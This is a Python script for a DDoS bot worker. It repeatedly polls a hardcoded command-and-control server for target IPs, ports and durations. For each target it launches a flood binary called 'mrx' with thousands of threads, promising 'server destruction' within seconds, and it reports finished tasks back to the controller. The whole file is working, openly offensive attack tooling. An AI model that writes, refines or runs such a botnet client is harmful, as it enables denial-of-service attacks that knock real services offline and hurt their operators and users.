import requests
import subprocess
import time

BASE_URL = 'http://31.97.128.103:3001'
SOUL_PATH = '/Mrxopwoowbysoul/'
DONE_PATH = '/Mrxopwoowbysoul/done'

active_tasks = {}

def process_new_task(added):
    ip = added.get('ip')
    port = added.get('port')
    time_val = added.get('time')

    if ip and port and time_val:
        key = (ip, str(port), str(time_val))
        if key not in active_tasks:
            print(f"[🚀 ULTRA INSTANT ATTACK]: IP={ip}, Port={port}, Time={time_val}")
            try:
                # 🚀 ULTRA INSTANT DESTRUCTION - 64 BYTES + 2200 THREADS
                process = subprocess.Popen(['./mrx', ip, str(port), str(time_val), '64', '2200'])
                print(f"[+] Launched: ./mrx {ip} {port} {time_val} 64 2200 (PID: {process.pid})")
                print(f"[🎯 EXPECTED]: 10-18 seconds server destruction")
                print(f"[⚡ PERFORMANCE]: ~400K PPS with Nuclear MRX.C")
                print(f"[🛡️ STABILITY]: Good (15-18% crash risk)")

            except Exception as e:
                print(f"[!] Failed to launch binary: {e}")
                # Fallback to stable configuration
                try:
                    fallback_process = subprocess.Popen(['./mrx', ip, str(port), str(time_val), '128', '2000'])
                    print(f"[↩️ FALLBACK]: Launched 128+2000 configuration")
                except Exception as fallback_error:
                    print(f"[❌ CRITICAL]: All attack methods failed: {fallback_error}")
            
            active_tasks[key] = {
                'start_time': time.time(),
                'duration': int(time_val),
                'config': '64_2200'
            }
        else:
            print(f"[⚠️ SKIPPED]: Task already running: {key}")
    else:
        print("[❌ INVALID]: Task received but missing ip, port, or time values")

def main_loop():
    while True:
        try:
            response = requests.get(f'{BASE_URL}{SOUL_PATH}')
            response.raise_for_status()
            data = response.json()

            # Process new tasks
            if isinstance(data, dict):
                if data.get('success') and 'added' in data:
                    process_new_task(data['added'])
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and item.get('success') and 'added' in item:
                        process_new_task(item['added'])

            # Update and check active tasks
            tasks_to_delete = []
            current_time = time.time()
            
            for key in list(active_tasks.keys()):
                task_data = active_tasks[key]
                elapsed_time = current_time - task_data['start_time']
                remaining_time = task_data['duration'] - elapsed_time
                
                if remaining_time <= 0:
                    ip, port, orig_time = key
                    print(f"[⏰ TIME EXPIRED]: IP={ip}, Port={port}, Original Time={orig_time}")
                    try:
                        del_resp = requests.get(f'{BASE_URL}{DONE_PATH}',
                                                params={'ip': ip, 'port': port, 'time': orig_time})
                        if del_resp.status_code == 200:
                            print(f"[✅ CLEANUP]: Sent delete request for IP={ip}, Port={port}, Time={orig_time}")
                        else:
                            print(f"[⚠️ CLEANUP FAILED]: Status code {del_resp.status_code}")
                    except Exception as e:
                        print(f"[❌ CLEANUP ERROR]: Failed to send delete request: {e}")
                    tasks_to_delete.append(key)
                else:
                    # Show progress for long-running attacks
                    if int(elapsed_time) % 30 == 0:  # Every 30 seconds
                        ip, port, orig_time = key
                        print(f"[📊 PROGRESS]: {ip}:{port} - {int(elapsed_time)}/{orig_time}s elapsed")

            # Delete expired tasks
            for key in tasks_to_delete:
                active_tasks.pop(key, None)

            time.sleep(1)
            
        except requests.RequestException as e:
            print(f"[🌐 NETWORK ERROR]: Request error: {e}")
            time.sleep(5)  # Longer delay on network errors
        except Exception as e:
            print(f"[❌ GENERAL ERROR]: {e}")
            time.sleep(2)

if __name__ == '__main__':
    print("🚀 MRX ULTRA INSTANT ATTACK SERVER STARTED")
    print("📍 API URL: http://31.97.128.103:3001/Mrxopwoowbysoul/")
    print("🎯 CONFIGURATION: 64 bytes + 2200 threads")
    print("⚡ EXPECTED: 10-18 seconds server destruction")
    print("=" * 60)
    main_loop()